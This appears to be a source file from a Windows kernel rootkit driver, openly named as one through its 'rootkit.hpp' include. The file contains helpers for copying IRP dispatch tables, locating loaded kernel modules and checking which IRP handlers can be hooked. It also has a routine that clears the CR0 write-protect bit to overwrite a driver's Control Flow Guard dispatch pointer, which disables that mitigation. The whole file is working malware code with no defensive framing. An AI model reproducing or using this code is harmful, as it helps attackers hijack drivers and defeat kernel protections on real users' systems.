#include "util.hpp"
#include "rootkit.hpp"
#include <intrin.h>

extern "C" NTSTATUS CopyMajorFunctions(_In_reads_bytes_(count * sizeof(PDRIVER_DISPATCH)) PDRIVER_DISPATCH * src, _Out_writes_bytes_all_(count * sizeof(PDRIVER_DISPATCH)) PDRIVER_DISPATCH * dst, const SIZE_T size)
{
    constexpr auto major_functions = IRP_MJ_MAXIMUM_FUNCTION + 1;

    if (size != major_functions)
    {
        return STATUS_INFO_LENGTH_MISMATCH;
    }

    for (unsigned i = 0; i < major_functions; ++i)
    {
        dst[i] = src[i];
    }

    return STATUS_SUCCESS;
}

extern "C" NTSTATUS GetNtoskrnl(OUT PKLDR_DATA_TABLE_ENTRY * out_entry)
{
    if (IsListEmpty(PsLoadedModuleList))
        return STATUS_NOT_FOUND;
    *out_entry = CONTAINING_RECORD(PsLoadedModuleList, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
    return STATUS_SUCCESS;
}

extern "C" bool IsInNtoskrnl(PVOID address)
{
    PKLDR_DATA_TABLE_ENTRY entry = nullptr;

    if (!NT_SUCCESS(GetNtoskrnl(&entry)))
    {
#if DEBUG
        DbgPrint("Failed to get ntoskrnl\n");
#endif
        return false;
    }

#if DEBUG
    DbgPrint("Module: %wZ\n", &entry->BaseDllName);
#endif

    return uintptr_t(address) >= uintptr_t(entry->DllBase) && uintptr_t(address) <= (uintptr_t(entry->DllBase) + entry->SizeOfImage);
}

extern "C" NTSTATUS GetModule(IN const PUNICODE_STRING name, OUT PKLDR_DATA_TABLE_ENTRY * out_entry)
{
    if (name == nullptr)
        return STATUS_INVALID_PARAMETER;

    if (IsListEmpty(PsLoadedModuleList))
        return STATUS_NOT_FOUND;

    for (auto list_entry = PsLoadedModuleList->Flink; list_entry != PsLoadedModuleList; list_entry = list_entry->Flink)
    {
        auto entry = CONTAINING_RECORD(list_entry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if (RtlCompareUnicodeString(&entry->BaseDllName, name, TRUE) == 0)
        {
            *out_entry = entry;
            return STATUS_SUCCESS;
        }
    }

    return STATUS_NOT_FOUND;
}

extern "C" bool IsHookableIRPHandler(PDRIVER_OBJECT driver, PDRIVER_DISPATCH dispatch)
{
    const auto address = uintptr_t(dispatch);

    if (IsInNtoskrnl(PVOID(dispatch)))
        return true;

    const auto min = uintptr_t(driver->DriverSection);
    const auto max = min + driver->Size;

    return address >= min && address <= max;
}

extern "C" ULONGLONG SetCfgDispatch(const PDRIVER_OBJECT driver, const ULONGLONG new_dispatch)
{
    ULONG size = 0;
    const auto directory = PIMAGE_LOAD_CONFIG_DIRECTORY(RtlImageDirectoryEntryToData(driver->DriverStart, TRUE, IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG, &size));

    if (directory != nullptr) {

#if DEBUG
        DbgPrint("IMAGE_LOAD_CONFIG_DIRECTORY found!\n");
#endif

        if (directory->GuardFlags & IMAGE_GUARD_CF_INSTRUMENTED) {
            {
#if DEBUG
                DbgPrint("CF Guard enabled! Patching.\n");
#endif
                const auto old_dispatch = directory->GuardCFDispatchFunctionPointer;

                auto cr0 = __readcr0();

                const auto old_cr0 = cr0;
                // disable write protection
                cr0 &= ~(1UL << 16);
                __writecr0(cr0);

                directory->GuardCFDispatchFunctionPointer = new_dispatch;

                __writecr0(old_cr0);

#if DEBUG
                DbgPrint("If you can read this CF Guard has been disabled.\n");
#endif
                return old_dispatch;
            }
        }
    }

    return 0;
}